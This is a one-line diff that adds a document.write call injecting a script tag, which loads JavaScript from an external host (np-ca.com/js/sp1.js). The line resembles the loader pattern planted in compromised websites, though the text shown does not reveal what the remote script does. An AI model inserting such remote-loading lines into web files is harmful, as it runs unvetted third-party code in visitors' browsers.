@@ -1,0 +1,1 @@
+﻿﻿document.write ('<script type="text/javascript"  src="https://www.np-ca.com/js/sp1.js"></script>');
